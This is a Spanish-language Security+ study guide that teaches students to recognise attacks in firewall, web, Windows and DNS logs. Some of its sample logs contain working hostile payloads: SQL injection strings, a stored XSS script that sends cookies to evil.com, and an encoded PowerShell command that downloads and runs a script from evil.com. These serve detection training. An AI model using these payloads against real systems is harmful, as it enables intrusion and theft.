# GUÍA DE ANÁLISIS DE LOGS - Security+ SY0-701

**Dominio 4: Security Operations (28%)**
**Objetivo 4.9**: Given a scenario, use data sources to support an investigation

---

## TABLA DE CONTENIDOS

1. [Tipos de Logs y Formatos](#tipos-de-logs)
2. [20 Ejemplos de Logs Reales](#ejemplos-reales)
3. [Identificación de Ataques](#identificacion-ataques)
4. [Ejercicios Prácticos](#ejercicios-practicos)
5. [Cheat Sheet de Patrones](#cheat-sheet-patrones)

---

## TIPOS DE LOGS

### 1. Firewall Logs
- **Ubicación común**: `/var/log/firewall.log`, Windows Event Log (Security)
- **Información clave**: SRC IP, DST IP, PORT, ACTION (ALLOW/DENY), PROTOCOL

### 2. Application Logs
- **Ubicación común**: `/var/log/application.log`, IIS logs, Apache access.log
- **Información clave**: HTTP status codes, user-agent, request URI, response time

### 3. Endpoint Logs (Windows Event Logs)
- **Event ID críticos**:
  - 4624: Successful logon
  - 4625: Failed logon
  - 4672: Special privileges assigned (admin)
  - 4688: New process created
  - 4698: Scheduled task created
  - 4720: User account created

### 4. IDS/IPS Logs (Suricata, Snort)
- **Información clave**: Signature ID, severity, source/dest IP, payload preview

### 5. Network Logs (NetFlow, Syslog)
- **Información clave**: Bandwidth usage, connection duration, protocol distribution

### 6. OS-Specific Security Logs
- **Linux**: `/var/log/auth.log`, `/var/log/secure`
- **Windows**: Security Event Log, System Event Log

---

## 20 EJEMPLOS DE LOGS REALES

### EJEMPLO 1: Brute Force SSH (Linux auth.log)

```
Mar 03 14:23:11 webserver sshd[12345]: Failed password for root from 203.0.113.42 port 55234 ssh2
Mar 03 14:23:13 webserver sshd[12346]: Failed password for root from 203.0.113.42 port 55235 ssh2
Mar 03 14:23:15 webserver sshd[12347]: Failed password for root from 203.0.113.42 port 55236 ssh2
Mar 03 14:23:17 webserver sshd[12348]: Failed password for root from 203.0.113.42 port 55237 ssh2
Mar 03 14:23:19 webserver sshd[12349]: Failed password for root from 203.0.113.42 port 55238 ssh2
Mar 03 14:23:21 webserver sshd[12350]: Accepted password for root from 203.0.113.42 port 55239 ssh2
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Múltiples intentos fallidos en corto tiempo (2 segundos entre intentos)
- ✅ Misma IP origen (203.0.113.42)
- ✅ Intentos contra cuenta privilegiada (root)
- ✅ Éxito final después de intentos fallidos
- ⚠️ **ACCIÓN**: Bloquear IP 203.0.113.42, investigar cuenta root comprometida

---

### EJEMPLO 2: SQL Injection (Apache Access Log)

```
192.168.1.105 - - [03/Mar/2026:14:32:15 +0000] "GET /products.php?id=1' OR '1'='1 HTTP/1.1" 200 4523 "-" "Mozilla/5.0"
192.168.1.105 - - [03/Mar/2026:14:32:18 +0000] "GET /products.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 8934 "-" "Mozilla/5.0"
192.168.1.105 - - [03/Mar/2026:14:32:22 +0000] "GET /products.php?id=1'; DROP TABLE users;-- HTTP/1.1" 500 256 "-" "Mozilla/5.0"
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Caracteres SQL en parámetro URL: `'`, `OR`, `UNION`, `--`
- ✅ Intento de bypass autenticación: `'1'='1`
- ✅ Enumeración de tablas: `UNION SELECT`
- ✅ Intento de destrucción: `DROP TABLE`
- ✅ HTTP 500 en último request (error de sintaxis SQL)
- ⚠️ **ACCIÓN**: Implementar WAF, sanitizar inputs, bloquear IP

---

### EJEMPLO 3: Privilege Escalation (Windows Event Log)

```
Event ID: 4672
Time: 2026-03-03 14:45:23
Account: CORP\jdoe
Privileges: SeDebugPrivilege, SeTakeOwnershipPrivilege, SeBackupPrivilege

Event ID: 4688
Time: 2026-03-03 14:45:25
Process: C:\Windows\System32\cmd.exe
Parent Process: C:\Users\jdoe\Downloads\exploit.exe
Account: CORP\jdoe

Event ID: 4720
Time: 2026-03-03 14:45:30
New Account: backdoor_admin
Created by: CORP\jdoe
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Usuario normal (jdoe) obtuvo privilegios especiales (4672)
- ✅ Ejecución de cmd.exe desde archivo sospechoso (exploit.exe)
- ✅ Creación de cuenta con nombre sospechoso (backdoor_admin)
- ✅ Secuencia temporal: privilegios → ejecución → creación cuenta (5-10 seg)
- ⚠️ **ACCIÓN**: Investigar jdoe, desactivar backdoor_admin, analizar exploit.exe

---

### EJEMPLO 4: Data Exfiltration (Firewall Log)

```
2026-03-03 15:12:45 ALLOW TCP 10.10.1.55:49321 -> 198.51.100.88:443 [1.2 MB outbound]
2026-03-03 15:13:02 ALLOW TCP 10.10.1.55:49322 -> 198.51.100.88:443 [3.5 MB outbound]
2026-03-03 15:13:18 ALLOW TCP 10.10.1.55:49323 -> 198.51.100.88:443 [2.8 MB outbound]
2026-03-03 15:13:34 ALLOW TCP 10.10.1.55:49324 -> 198.51.100.88:443 [4.1 MB outbound]
2026-03-03 15:13:50 ALLOW TCP 10.10.1.55:49325 -> 198.51.100.88:443 [1.9 MB outbound]
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Volumen anormal de datos salientes (13.5 MB en 1 minuto)
- ✅ Múltiples conexiones a misma IP externa (198.51.100.88)
- ✅ Puerto 443 (HTTPS) - dificulta inspección
- ✅ Patrón repetitivo cada ~15 segundos
- ✅ IP interna (10.10.1.55) puede ser host comprometido
- ⚠️ **ACCIÓN**: Bloquear 198.51.100.88, aislar host 10.10.1.55, análisis forense

---

### EJEMPLO 5: Lateral Movement (Windows Security Log)

```
Event ID: 4624 (Logon Type 3 - Network)
Time: 2026-03-03 16:20:15
Account: CORP\helpdesk
Source IP: 10.10.2.100
Target: DC01.corp.local

Event ID: 4624 (Logon Type 3)
Time: 2026-03-03 16:20:45
Account: CORP\helpdesk
Source IP: 10.10.2.100
Target: FILE01.corp.local

Event ID: 4624 (Logon Type 3)
Time: 2026-03-03 16:21:10
Account: CORP\helpdesk
Source IP: 10.10.2.100
Target: SQL01.corp.local

Event ID: 4648 (Explicit Credentials)
Time: 2026-03-03 16:21:35
Account Used: CORP\administrator
Initiated by: CORP\helpdesk
Target: DC01.corp.local
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Misma cuenta (helpdesk) accediendo múltiples servidores en minutos
- ✅ Patrón de movimiento: DC → FileServer → SQL
- ✅ Logon Type 3 (acceso de red, no interactivo)
- ✅ Uso de credenciales explícitas de admin (4648)
- ✅ Cuenta helpdesk no debería tener acceso a DC/SQL
- ⚠️ **ACCIÓN**: Revocar sesión helpdesk, resetear credenciales admin

---

### EJEMPLO 6: Ransomware Activity (File System Events)

```
2026-03-03 17:05:12 File Modified: C:\Users\jsmith\Documents\Report.docx -> Report.docx.locked
2026-03-03 17:05:12 File Modified: C:\Users\jsmith\Documents\Budget.xlsx -> Budget.xlsx.locked
2026-03-03 17:05:13 File Created: C:\Users\jsmith\Documents\README_RANSOM.txt
2026-03-03 17:05:14 File Modified: C:\Users\jsmith\Pictures\vacation.jpg -> vacation.jpg.locked
2026-03-03 17:05:15 Process Created: C:\Users\jsmith\AppData\Local\Temp\encrypt.exe
2026-03-03 17:05:20 File Modified: C:\Shared\Finance\Q1_Report.pdf -> Q1_Report.pdf.locked
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Extensiones cambiadas masivamente (.locked)
- ✅ Creación de nota de rescate (README_RANSOM.txt)
- ✅ Proceso sospechoso (encrypt.exe desde Temp)
- ✅ Afecta múltiples ubicaciones (Documents, Pictures, Shared)
- ✅ Alta velocidad de modificación (segundos)
- ⚠️ **ACCIÓN**: INMEDIATA - Aislar host, matar proceso, restaurar desde backup

---

### EJEMPLO 7: DDoS Attack (Firewall Log)

```
2026-03-03 18:30:01 SYN 185.220.101.5:12345 -> 203.0.113.10:80
2026-03-03 18:30:01 SYN 185.220.101.8:23456 -> 203.0.113.10:80
2026-03-03 18:30:01 SYN 185.220.101.12:34567 -> 203.0.113.10:80
2026-03-03 18:30:01 SYN 185.220.101.23:45678 -> 203.0.113.10:80
2026-03-03 18:30:01 SYN 185.220.101.34:56789 -> 203.0.113.10:80
[... 10,000+ similar entries in 1 second ...]
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Volumen masivo de SYN packets (10k+ por segundo)
- ✅ IPs origen diferentes (botnet distribuido)
- ✅ Mismo destino (203.0.113.10:80)
- ✅ No hay ACK/FIN (SYN flood incompleto)
- ✅ Consumo de recursos (tabla de estados del firewall)
- ⚠️ **ACCIÓN**: Activar SYN cookies, rate limiting, contactar ISP/DDoS mitigation

---

### EJEMPLO 8: Phishing Detection (Email Gateway Log)

```
2026-03-03 09:15:23 SMTP Connection from: mail.suspicious-domain.ru
From: ceo@yourcompany.com (SPOOFED)
To: finance@yourcompany.com
Subject: URGENT: Wire Transfer Required
Attachment: Invoice_March.pdf.exe (5.2 MB)
SPF: FAIL
DKIM: FAIL
DMARC: REJECT
Action: QUARANTINED
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Dominio sospechoso (.ru vs dominio real)
- ✅ Email spoofing (From: ceo@ pero falla SPF)
- ✅ Fallo de autenticación (SPF, DKIM, DMARC)
- ✅ Archivo adjunto sospechoso (.exe disfrazado de .pdf)
- ✅ Urgencia artificial ("URGENT")
- ✅ Destinatario con privilegios financieros
- ⚠️ **ACCIÓN**: Confirmar cuarentena, alertar a finance@, entrenar usuarios

---

### EJEMPLO 9: DNS Tunneling (DNS Query Log)

```
2026-03-03 11:45:12 Query: 4d616c776172652064617461.malicious-c2.com (TXT)
2026-03-03 11:45:13 Query: 6578666974726174696f6e.malicious-c2.com (TXT)
2026-03-03 11:45:14 Query: 70617373776f7264733a61646d696e.malicious-c2.com (TXT)
2026-03-03 11:45:15 Query: 31323334353637383930.malicious-c2.com (TXT)
2026-03-03 11:45:16 Response: TXT "ACK-RECEIVED" (from malicious-c2.com)
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Subdominios con datos en hexadecimal (4d616c... = "Malware data")
- ✅ Queries TXT frecuentes (usualmente para C2)
- ✅ Longitud anormal de subdominios
- ✅ Dominio sospechoso (malicious-c2.com)
- ✅ Patrón request-response repetitivo
- ⚠️ **ACCIÓN**: Bloquear dominio, analizar host origen, revisar exfiltración

---

### EJEMPLO 10: Pass-the-Hash Attack (Windows Event Log)

```
Event ID: 4624 (Logon Type 9 - NewCredentials)
Time: 2026-03-03 13:10:22
Account: CORP\admin
Logon Process: seclogo
Authentication: NTLM
Source: 10.10.3.50
Target: DC01.corp.local
NTLM Hash Used: Yes (no password verification)

Event ID: 4672
Time: 2026-03-03 13:10:23
Account: CORP\admin
Privileges: SeDebugPrivilege, SeImpersonatePrivilege
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Logon Type 9 (NewCredentials con RunAs)
- ✅ Autenticación NTLM (permite hash)
- ✅ No hay evento 4768 (Kerberos TGT) previo
- ✅ Privilegios inmediatos post-logon
- ✅ Posible robo de hash de memoria
- ⚠️ **ACCIÓN**: Forzar Kerberos, deshabilitar NTLM, resetear contraseña admin

---

### EJEMPLO 11: Port Scan (IDS/IPS Alert)

```
[**] [1:469:3] SCAN nmap TCP [**]
[Priority: 3]
03/03-14:55:01.234567 203.0.113.50:41234 -> 10.10.1.100:21
TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:40 DF
***S**** Seq: 0xABCDEF  Ack: 0x0  Win: 0x400  TcpLen: 20

[**] [1:469:3] SCAN nmap TCP [**]
03/03-14:55:01.345678 203.0.113.50:41235 -> 10.10.1.100:22
[... similar entries for ports 23, 25, 53, 80, 110, 143, 443, 3389 ...]
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Múltiples puertos escaneados en segundos
- ✅ SYN packets sin completar handshake
- ✅ Signature IDS detecta nmap
- ✅ Secuencia de puertos común (21, 22, 23, 25...)
- ✅ IP externa (203.0.113.50) escaneando red interna
- ⚠️ **ACCIÓN**: Bloquear IP, verificar firewall externo, revisar servicios expuestos

---

### EJEMPLO 12: Insider Threat - Data Theft (USB Log + DLP)

```
2026-03-03 16:45:10 Device Connected: USB Mass Storage (SN: 1234567890)
User: CORP\jdoe
Device Name: Kingston DataTraveler 64GB

2026-03-03 16:45:35 DLP Alert: Sensitive Data Transfer
User: CORP\jdoe
Source: C:\Confidential\CustomerDB.xlsx
Destination: E:\ (USB Drive)
Classification: CONFIDENTIAL
Size: 25 MB
Action: BLOCKED

2026-03-03 16:46:02 File Copy Attempt: BLOCKED
Source: C:\Finance\Salaries_2026.pdf
Destination: E:\
User: CORP\jdoe
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Conexión de USB sin autorización
- ✅ Intento de copiar datos confidenciales
- ✅ DLP bloqueó transferencia
- ✅ Múltiples intentos en corto tiempo
- ✅ Usuario con acceso a datos sensibles
- ⚠️ **ACCIÓN**: Investigar jdoe, revisar accesos recientes, entrevista HR

---

### EJEMPLO 13: Cryptojacking (Process Monitor + Network)

```
2026-03-03 20:15:45 Process Started: chrome.exe
PID: 8765
User: CORP\user1
CPU Usage: 95%
Network: Connection to pool.minero.com:3333

2026-03-03 20:16:00 High CPU Alert: chrome.exe
Duration: 15 seconds
CPU: 95%
Memory: 2.5 GB

2026-03-03 20:16:15 Network Traffic:
Destination: pool.minero.com (185.220.101.200)
Port: 3333 (Stratum mining protocol)
Bandwidth: 50 KB/s sustained
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Uso anormal de CPU (95% constante)
- ✅ Conexión a pool de minería (port 3333)
- ✅ Proceso legítimo comprometido (chrome.exe)
- ✅ Alto consumo de memoria
- ✅ Tráfico sostenido a IP de mining pool
- ⚠️ **ACCIÓN**: Matar proceso, escanear malware, bloquear pool.minero.com

---

### EJEMPLO 14: XSS Attack (Web Application Log)

```
2026-03-03 10:30:45 POST /comment HTTP/1.1
Host: blog.example.com
User: guest_user
Content: <script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>
Stored: Yes (comment saved to database)
Status: 200 OK

2026-03-03 10:31:12 GET /post/12345 HTTP/1.1
User: victim_user
Cookie: sessionid=abc123xyz
Response: 200 OK (page includes malicious script)

2026-03-03 10:31:13 GET http://evil.com/steal.php?cookie=sessionid=abc123xyz
Source IP: victim_user (redirected from blog.example.com)
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Script tag en input de usuario (`<script>`)
- ✅ Intento de robo de cookies (`document.cookie`)
- ✅ Redirección a dominio externo (evil.com)
- ✅ Stored XSS (guardado en DB, afecta a todos)
- ✅ Víctima ejecuta script al cargar página
- ⚠️ **ACCIÓN**: Sanitizar input, eliminar comentario, alertar víctimas

---

### EJEMPLO 15: Account Lockout (Potential Password Spraying)

```
Event ID: 4625 (Failed Logon)
Time: 2026-03-03 08:00:05
Account: CORP\alice
Source IP: 192.168.1.200
Failure Reason: Bad password

Event ID: 4625
Time: 2026-03-03 08:00:10
Account: CORP\bob
Source IP: 192.168.1.200
Failure Reason: Bad password

Event ID: 4625
Time: 2026-03-03 08:00:15
Account: CORP\charlie
Source IP: 192.168.1.200
Failure Reason: Bad password

[... 50 more accounts in 5 minutes ...]

Event ID: 4740 (Account Locked Out)
Account: CORP\alice
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Múltiples cuentas diferentes (alice, bob, charlie...)
- ✅ Misma IP origen (192.168.1.200)
- ✅ Password spraying (1 intento por cuenta, evita lockout)
- ✅ Intervalo regular (5 segundos entre intentos)
- ✅ Eventual lockout de alice (contraseña común?)
- ⚠️ **ACCIÓN**: Bloquear IP 192.168.1.200, forzar MFA, revisar políticas de contraseña

---

### EJEMPLO 16: Man-in-the-Middle (SSL/TLS Certificate Warning)

```
2026-03-03 12:10:34 SSL/TLS Connection Alert
User: CORP\employee1
Destination: bank.example.com:443
Certificate Issuer: CN=AttackerCA, O=FakeOrg
Certificate Expected: CN=DigiCert, O=DigiCert Inc
Error: Certificate chain validation failed
Action: Connection blocked by proxy

2026-03-03 12:10:40 ARP Spoofing Detected
MAC: 00:11:22:33:44:55 (claiming to be 10.10.1.1 - Gateway)
Real Gateway MAC: AA:BB:CC:DD:EE:FF
Source: 10.10.1.150
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Certificado SSL inválido (issuer sospechoso)
- ✅ Intento de suplantación de entidad confiable
- ✅ ARP spoofing detectado (falso gateway)
- ✅ Host malicioso en red interna (10.10.1.150)
- ✅ Proxy bloqueó conexión
- ⚠️ **ACCIÓN**: Aislar 10.10.1.150, revisar tabla ARP, escanear red interna

---

### EJEMPLO 17: Scheduled Task Persistence (Windows Event Log)

```
Event ID: 4698 (Scheduled Task Created)
Time: 2026-03-03 02:15:30
Task Name: \Microsoft\Windows\UpdateCheck
Created by: CORP\SYSTEM
Action: C:\Windows\Temp\update.exe -silent
Trigger: Daily at 2:00 AM
Privileges: SYSTEM

Event ID: 4699 (Scheduled Task Deleted)
Time: 2026-03-03 02:15:45
Task Name: \Microsoft\Windows\WindowsUpdate
Deleted by: CORP\SYSTEM
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Tarea creada con nombre legítimo pero ubicación sospechosa
- ✅ Ejecutable en \Temp (no ubicación de Windows Update)
- ✅ Tarea legítima eliminada (WindowsUpdate)
- ✅ Creación nocturna (2:15 AM - fuera de horario)
- ✅ Privilegios SYSTEM
- ⚠️ **ACCIÓN**: Eliminar tarea maliciosa, analizar update.exe, restaurar tarea legítima

---

### EJEMPLO 18: Cloud Misconfiguration (AWS CloudTrail)

```
{
  "eventTime": "2026-03-03T15:30:45Z",
  "eventName": "PutBucketAcl",
  "userIdentity": {
    "type": "IAMUser",
    "userName": "dev-user"
  },
  "requestParameters": {
    "bucketName": "company-confidential-data",
    "AccessControlPolicy": {
      "Grant": [
        {
          "Grantee": "*",
          "Permission": "READ"
        }
      ]
    }
  },
  "responseElements": null,
  "errorCode": null
}
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Bucket S3 con datos confidenciales
- ✅ ACL cambiada a pública (`Grantee: *`)
- ✅ Usuario dev (no admin) modificando seguridad
- ✅ Permiso READ público (data breach potencial)
- ✅ Sin errorCode (cambio exitoso)
- ⚠️ **ACCIÓN**: URGENTE - Revocar ACL pública, auditar dev-user, revisar datos expuestos

---

### EJEMPLO 19: Credential Stuffing (Web Auth Log)

```
2026-03-03 19:45:01 Login Attempt FAILED - user: alice@example.com, password: [HASH], IP: 203.0.113.100
2026-03-03 19:45:02 Login Attempt FAILED - user: bob@example.com, password: [HASH], IP: 203.0.113.100
2026-03-03 19:45:03 Login Attempt SUCCESS - user: charlie@example.com, password: [HASH], IP: 203.0.113.100
2026-03-03 19:45:05 Session Created - user: charlie@example.com, SessionID: xyz789
2026-03-03 19:45:10 Password Change Request - user: charlie@example.com, IP: 203.0.113.100
2026-03-03 19:45:15 Email Change Request - user: charlie@example.com, new: attacker@evil.com
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ Múltiples usuarios, misma IP origen
- ✅ Rapidez entre intentos (1 segundo)
- ✅ Éxito con charlie (credencial reutilizada de otro breach)
- ✅ Cambios inmediatos post-login (contraseña + email)
- ✅ IP origen externa (203.0.113.100)
- ⚠️ **ACCIÓN**: Bloquear IP, revertir cambios charlie, forzar reset contraseñas

---

### EJEMPLO 20: Fileless Malware (PowerShell Logging)

```
Event ID: 4104 (PowerShell Script Block Logging)
Time: 2026-03-03 11:20:45
ScriptBlock:
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=

Decoded:
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')

Event ID: 3 (Network Connection - Sysmon)
Process: powershell.exe
Destination: evil.com:80
```

**🚨 INDICADORES DE ATAQUE**:
- ✅ PowerShell con evasión (`-NoProfile -ExecutionPolicy Bypass`)
- ✅ Comando codificado en Base64 (ofuscación)
- ✅ Descarga remota de script (`DownloadString`)
- ✅ Ejecución directa en memoria (`IEX` - Invoke-Expression)
- ✅ Conexión a dominio sospechoso (evil.com)
- ⚠️ **ACCIÓN**: Matar proceso PowerShell, bloquear evil.com, habilitar AMSI, restricción PowerShell

---

## IDENTIFICACIÓN DE ATAQUES - TABLA RÁPIDA

| Tipo de Ataque | Indicadores Clave | Logs a Revisar |
|----------------|-------------------|----------------|
| **Brute Force** | Múltiples intentos fallidos + misma IP/cuenta | auth.log, Event ID 4625 |
| **SQL Injection** | `'`, `OR`, `UNION`, `--` en parámetros URL | Apache/IIS access logs |
| **Privilege Escalation** | Event 4672 + proceso sospechoso + creación cuenta | Windows Security Log |
| **Data Exfiltration** | Alto volumen outbound + IP externa + horario inusual | Firewall logs, NetFlow |
| **Lateral Movement** | Logon Type 3 múltiples hosts + Event 4648 | Windows Security Log |
| **Ransomware** | Extensiones cambiadas + nota rescate + proceso cifrado | File system audit, EDR |
| **DDoS** | Volumen masivo SYN + múltiples IPs + mismo destino | Firewall logs, IDS |
| **Phishing** | SPF/DKIM/DMARC fail + adjunto .exe + urgencia | Email gateway logs |
| **DNS Tunneling** | Subdominios hex + queries TXT frecuentes | DNS query logs |
| **Pass-the-Hash** | Logon Type 9 + NTLM + sin Kerberos | Event ID 4624, 4768 |
| **Port Scan** | SYN múltiples puertos + sin ACK + IP externa | IDS/IPS, firewall |
| **Insider Threat** | DLP alert + USB + datos confidenciales | DLP logs, USB audit |
| **Cryptojacking** | CPU 95%+ + conexión mining pool (3333) | Process monitor, netstat |
| **XSS** | `<script>` en input + robo cookie | Web application logs |
| **Password Spraying** | Múltiples cuentas + 1 intento c/u + misma IP | Event ID 4625 |
| **MITM** | Certificado inválido + ARP spoofing | Proxy logs, ARP table |
| **Persistence** | Scheduled task sospechosa + \Temp + horario nocturno | Event ID 4698 |
| **Cloud Misconfig** | ACL pública + bucket confidencial | CloudTrail, Azure Activity |
| **Credential Stuffing** | Múltiples usuarios + rápido + cambios post-login | Web auth logs |
| **Fileless Malware** | PowerShell encoded + bypass + IEX + descarga remota | Event ID 4104, Sysmon |

---

## EJERCICIOS PRÁCTICOS

### EJERCICIO 1: Identifica el Ataque

```
2026-03-03 22:15:01 DENY TCP 10.10.5.100:49123 -> 10.10.1.10:445
2026-03-03 22:15:01 DENY TCP 10.10.5.100:49124 -> 10.10.1.11:445
2026-03-03 22:15:01 DENY TCP 10.10.5.100:49125 -> 10.10.1.12:445
2026-03-03 22:15:02 DENY TCP 10.10.5.100:49126 -> 10.10.1.13:445
2026-03-03 22:15:02 ALLOW TCP 10.10.5.100:49127 -> 10.10.1.14:445
2026-03-03 22:15:05 ALLOW TCP 10.10.5.100:49128 -> 10.10.1.14:135
```

**PREGUNTA**: ¿Qué ataque es? ¿Qué indica la secuencia DENY → ALLOW?

<details>
<summary>RESPUESTA</summary>

**Ataque**: SMB Scanning / Network Enumeration
**Indicadores**:
- Puerto 445 (SMB) escaneado en múltiples hosts
- Host 10.10.5.100 buscando shares disponibles
- Encontró host vulnerable (10.10.1.14) que permite SMB
- Puerto 135 (RPC) también accedido (preparación para exploit)

**Acción**: Bloquear 10.10.5.100, verificar por qué 10.10.1.14 permite SMB desde red interna
</details>

---

### EJERCICIO 2: Secuencia de Compromiso

```
[T+0:00] Event 4625: Failed login "admin" from 192.168.1.50
[T+0:05] Event 4625: Failed login "administrator" from 192.168.1.50
[T+0:10] Event 4624: Successful login "helpdesk" from 192.168.1.50
[T+0:12] Event 4688: Process created: C:\Windows\System32\net.exe user backdoor Password123 /add
[T+0:13] Event 4732: User added to group: backdoor → Administrators
[T+0:15] Event 4624: Successful login "backdoor" from 192.168.1.50
```

**PREGUNTA**: Describe la kill chain completa. ¿En qué momento debió activarse una alerta?

<details>
<summary>RESPUESTA</summary>

**Kill Chain**:
1. **Reconnaissance**: Intentos fallidos admin/administrator
2. **Initial Access**: Éxito con cuenta helpdesk (contraseña débil)
3. **Execution**: Comando net.exe para crear usuario
4. **Privilege Escalation**: Añadir backdoor a Administrators
5. **Persistence**: Login con cuenta backdoor

**Alertas que debieron activarse**:
- T+0:00: Brute force detected (múltiples intentos fallidos)
- T+0:12: Comando net.exe user /add (creación cuenta no autorizada)
- T+0:13: Añadir usuario a Administrators (escalación privilegios)

**Acción**: Bloquear IP 192.168.1.50, eliminar cuenta backdoor, resetear helpdesk
</details>

---

### EJERCICIO 3: Log Correlation

Tienes estos 3 logs de sistemas diferentes:

**Firewall**:
```
2026-03-03 14:00:00 ALLOW TCP 203.0.113.99:443 -> 10.10.2.50:58234
```

**Proxy**:
```
2026-03-03 14:00:01 CONNECT evil-c2.com:443 from 10.10.2.50 - SSL_BYPASS
```

**EDR (Endpoint)**:
```
2026-03-03 14:00:05 Suspicious process: rundll32.exe connecting to 203.0.113.99:443
2026-03-03 14:00:10 Registry modification: HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater = C:\Temp\update.dll
```

**PREGUNTA**: Correlaciona los eventos. ¿Qué está pasando? ¿Qué tipo de malware?

<details>
<summary>RESPUESTA</summary>

**Análisis Correlacionado**:
1. Host comprometido (10.10.2.50) contacta C2 server (evil-c2.com / 203.0.113.99)
2. Conexión HTTPS (443) para evadir inspección (SSL_BYPASS)
3. Rundll32.exe ejecutando DLL maliciosa (LOLBin abuse)
4. Persistencia vía registro (arranque automático)

**Tipo de Malware**: Trojan con C2 communication + persistence
**Severidad**: ALTA - activo y persistente

**Acción Inmediata**:
1. Aislar 10.10.2.50 de red
2. Bloquear 203.0.113.99 y evil-c2.com
3. Eliminar C:\Temp\update.dll
4. Limpiar registro Run
5. Reimaging recomendado
</details>

---

## CHEAT SHEET DE PATRONES

### Patrones de Ataques en Logs

```
BRUTE FORCE:
- Patrón: [FAIL FAIL FAIL ... SUCCESS] + misma IP
- Timing: < 5 segundos entre intentos
- Mitigación: Account lockout, rate limiting, MFA

SQL INJECTION:
- Patrón: ', OR, UNION, --, ; en parámetros
- Response: HTTP 500 (error), 200 con datos anormales
- Mitigación: Prepared statements, WAF, input validation

LATERAL MOVEMENT:
- Patrón: Event 4624 Type 3 + múltiples hosts + minutos
- Indicador: Event 4648 (explicit credentials)
- Mitigación: Least privilege, network segmentation

DATA EXFILTRATION:
- Patrón: Volumen alto outbound + horario inusual + IP externa
- Threshold: > 1 GB en < 10 min fuera de horario
- Mitigación: DLP, egress filtering, CASB

RANSOMWARE:
- Patrón: File rename masivo + .locked/.encrypted + nota .txt
- Timing: Cientos de archivos en segundos
- Mitigación: EDR, backup offline, email filtering

DDOS:
- Patrón: SYN flood (sin ACK) + múltiples IPs + mismo destino
- Volumen: > 10k requests/segundo
- Mitigación: SYN cookies, rate limiting, CDN/WAF

PASSWORD SPRAYING:
- Patrón: Múltiples cuentas + 1 intento c/u + pausas
- Timing: 1 intento cada 30 min (evita lockout)
- Mitigación: MFA, complex password policy, monitoring

PHISHING:
- Patrón: SPF/DKIM fail + .exe attachment + urgency keywords
- Subject: "URGENT", "ACTION REQUIRED", "SUSPENDED"
- Mitigación: DMARC reject, user training, sandbox attachments

CRYPTOJACKING:
- Patrón: CPU 90%+ sustained + conexión :3333 (Stratum)
- Proceso: Legítimo (chrome, explorer) con consumo anormal
- Mitigación: Application whitelisting, network monitoring

PRIVILEGE ESCALATION:
- Patrón: Event 4672 (special privileges) + proceso sospechoso + tiempo < 1 min
- Indicador: SeDebugPrivilege, SeTakeOwnershipPrivilege
- Mitigación: Least privilege, UAC, EDR
```

---

## COMANDOS ÚTILES PARA ANÁLISIS

### Linux
```bash
# Buscar intentos de SSH fallidos
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# Top 10 IPs atacantes
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -10

# Conexiones sospechosas (puertos altos)
netstat -antp | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr
```

### Windows PowerShell
```powershell
# Eventos de logon fallidos (últimas 24h)
Get-EventLog -LogName Security -After (Get-Date).AddDays(-1) | Where-Object {$_.EventID -eq 4625}

# Cuentas bloqueadas
Get-EventLog -LogName Security -After (Get-Date).AddDays(-1) | Where-Object {$_.EventID -eq 4740}

# Procesos con conexiones de red
Get-NetTCPConnection | Select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess
```

---

## TABLA DE EVENT IDs CRÍTICOS (Windows)

| Event ID | Descripción | Severidad | Usar para detectar |
|----------|-------------|-----------|-------------------|
| 4624 | Successful logon | INFO | Lateral movement (Type 3) |
| 4625 | Failed logon | WARNING | Brute force, password spraying |
| 4648 | Logon with explicit credentials | HIGH | Pass-the-hash, privilege escalation |
| 4672 | Special privileges assigned | HIGH | Privilege escalation |
| 4688 | New process created | INFO | Malicious execution |
| 4698 | Scheduled task created | MEDIUM | Persistence |
| 4720 | User account created | HIGH | Backdoor accounts |
| 4732 | User added to security-enabled group | HIGH | Privilege escalation |
| 4740 | User account locked out | WARNING | Brute force |
| 4768 | Kerberos TGT requested | INFO | Golden ticket (ausencia de este evento) |
| 4776 | NTLM authentication | INFO | Pass-the-hash (con ausencia de 4768) |
| 5140 | Network share accessed | INFO | Lateral movement |
| 7045 | Service installed | HIGH | Persistence, malware |

---

**PRÓXIMOS PASOS**:
1. Practica con los 20 ejemplos
2. Resuelve los 3 ejercicios
3. Familiarízate con Event IDs críticos
4. Practica comandos de análisis
5. Correlaciona eventos de múltiples fuentes

**Recuerda**: En el examen Security+, te mostrarán fragmentos de logs y deberás identificar:
- Tipo de ataque
- Severidad
- Acción apropiada
